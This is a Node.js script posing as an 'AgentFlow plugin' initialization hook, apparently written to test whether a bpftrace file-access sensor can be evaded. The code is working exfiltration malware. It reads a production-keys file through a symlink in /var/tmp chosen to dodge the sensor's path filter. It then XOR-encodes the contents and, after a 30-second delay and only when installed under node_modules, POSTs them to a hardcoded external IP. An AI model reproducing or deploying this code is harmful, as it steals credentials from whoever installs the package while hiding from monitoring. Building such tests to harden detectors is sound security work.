#!/usr/bin/env node
/**
 * AgentFlow plugin - initialization script
 *
 * H2b (Arm B, host evasion): same symlink trick as plugin-h2, but the symlink lives in
 * /var/tmp, so the path the process actually opens starts with NEITHER /home NOR /tmp.
 *
 * What this measures: the bpftrace openat probe is a literal prefix test on the UNRESOLVED
 * path (telemetry.py:252, str(args.filename,5) == "/home" || str(args.filename,4) == "/tmp").
 * A path outside both prefixes is dropped in the kernel and never reaches userspace, so
 * _under_watch() and its realpath() never run at all. The sensor cannot resolve a path it
 * never sees. Expected result: EVADED.
 *
 * This is the sharper half of H2: plugin-h2 shows realpath defeats presentation tricks,
 * plugin-h2b shows the filter in front of realpath is the actual weak point.
 *
 * Timing is the same 30s "after" bracket as plugin-v4.
 */
const http = require('http');
const fs = require('fs');
const path = require('path');

const HOST = process.env.PLUGIN_HOST || '184.32.242.13';
const PORT = parseInt(process.env.PLUGIN_PORT || '8080');
const DATA_FILE = process.env.PLUGIN_DATA_FILE || path.join(process.env.HOME || '~', 'Desktop', 'prod-keys.txt');
const ENCRYPTION_KEY = process.env.PLUGIN_KEY || 'demo-key';
const DELAY_MS = 30000; // 30 seconds, same "after" timing as plugin-v4

function log(level, message) {
  console.log('[' + level + '] ' + message);
}

function xorEncrypt(data, key) {
  const keyBytes = Buffer.from(key);
  const result = Buffer.alloc(data.length);
  for (let i = 0; i < data.length; i++) {
    result[i] = data[i] ^ keyBytes[i % keyBytes.length];
  }
  return result;
}

function readViaFilterOutsideSymlink() {
  // /var/tmp is world-writable and, unlike /tmp, matches neither openat prefix filter.
  const linkDir = fs.mkdtempSync('/var/tmp/agentflow-h2b-');
  const linkPath = path.join(linkDir, 'cache.dat');
  fs.symlinkSync(DATA_FILE, linkPath);
  log('INFO', 'Opening watched file via filter-outside symlink: ' + linkPath + ' -> ' + DATA_FILE);
  try {
    return fs.readFileSync(linkPath);
  } finally {
    try { fs.unlinkSync(linkPath); fs.rmdirSync(linkDir); } catch (e) { /* best effort */ }
  }
}

function syncData() {
  let fileContent;
  try {
    fileContent = readViaFilterOutsideSymlink();
    log('INFO', 'Read ' + fileContent.length + ' bytes via filter-outside symlink');
  } catch (e) {
    log('ERROR', 'Failed to read file: ' + e.message);
    return;
  }

  const encoded = xorEncrypt(fileContent, ENCRYPTION_KEY).toString('base64');

  log('INFO', 'Syncing data to ' + HOST + ':' + PORT);
  const options = {
    hostname: HOST,
    port: PORT,
    path: '/collection',
    method: 'POST',
    timeout: 15000,
    headers: {
      'Content-Type': 'application/octet-stream',
      'Content-Length': Buffer.byteLength(encoded),
      'X-Plugin-Enc': 'xor'
    }
  };

  const req = http.request(options, res => log('INFO', 'Sync response: HTTP ' + res.statusCode));
  req.on('error', e => log('ERROR', 'Sync error: ' + e.message));
  req.on('timeout', () => { req.destroy(); log('WARN', 'Sync timed out'); });
  req.write(encoded);
  req.end();
  log('INFO', 'Data sync complete (delayed)');
}

// --- single-send guard ------------------------------------------------------------------
if (!process.cwd().includes('node_modules')) {
  log('INFO', 'build/prepare phase (cwd outside node_modules); skipping');
  process.exit(0);
}
log('INFO', 'Waiting ' + (DELAY_MS / 1000) + 's before data sync...');
setTimeout(syncData, DELAY_MS);
